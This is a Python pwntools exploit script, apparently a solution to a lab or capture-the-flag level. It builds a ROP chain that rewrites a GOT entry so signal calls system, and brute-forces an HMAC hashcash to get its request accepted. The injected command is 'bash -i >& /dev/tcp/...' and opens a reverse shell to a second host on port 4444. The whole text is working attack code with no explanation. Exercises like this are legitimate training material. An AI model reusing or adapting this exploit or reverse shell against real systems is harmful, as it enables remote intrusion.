#!/usr/bin/env python
from pwn import *
from hashlib import sha1
from hmac import *

r = remote('192.168.1.109', 20003)

token = r.recv().strip().strip('"')  
log.info('Token: ' + token)

reverse_host = '192.168.1.108'
reverse_port = 4444

command = '/' * 100 + 'bin/bash -i >& /dev/tcp/' + reverse_host + '/' + str(reverse_port) + ' 0>&1'

rop_chain  = ''
rop_chain += 'A' * 127
rop_chain += '\\\u4142'
rop_chain += 'A' * 31
rop_chain += p32(0x8048bf0)  # pop ebx
rop_chain += p32(0xaaa9b83c) # ((.got) signal - 0x5d5b04c4) & 0xffffffff
rop_chain += p32(0x8049b4f)  # pop eax; add esp, 0x5c
rop_chain += '\\\ud0ef\\\u0000'
rop_chain += 'A' * 0x5c
rop_chain += p32(0x080493fe) # add dword ptr [ebx + 0x5d5b04c4], eax;
rop_chain += p32(0x8048cd0)  # signal (system)
rop_chain += p32(0x8048f80)  # exit
rop_chain += p32(0x9c5a60c)  # command

request0 = "{'title': '" + rop_chain + "', 'contents': '" + command + "'}"

log.info('Bruteforcing HMAC')

mac = new(token, token + "\n" + request0, sha1).digest()  
i = 0  

while(mac.encode('hex')[0:4] != '0000'):
	request1 = request0[0:-1] + ", 'hashcash': '" + str(i) + "'}"
	mac = new(token, token + "\n" + request1, sha1).digest()
	i += 1

log.success('Got HMAC: ' + mac.encode('hex'))

r.send(token + "\n" + request1)
log.info('Spawning reverse shell')
r.close()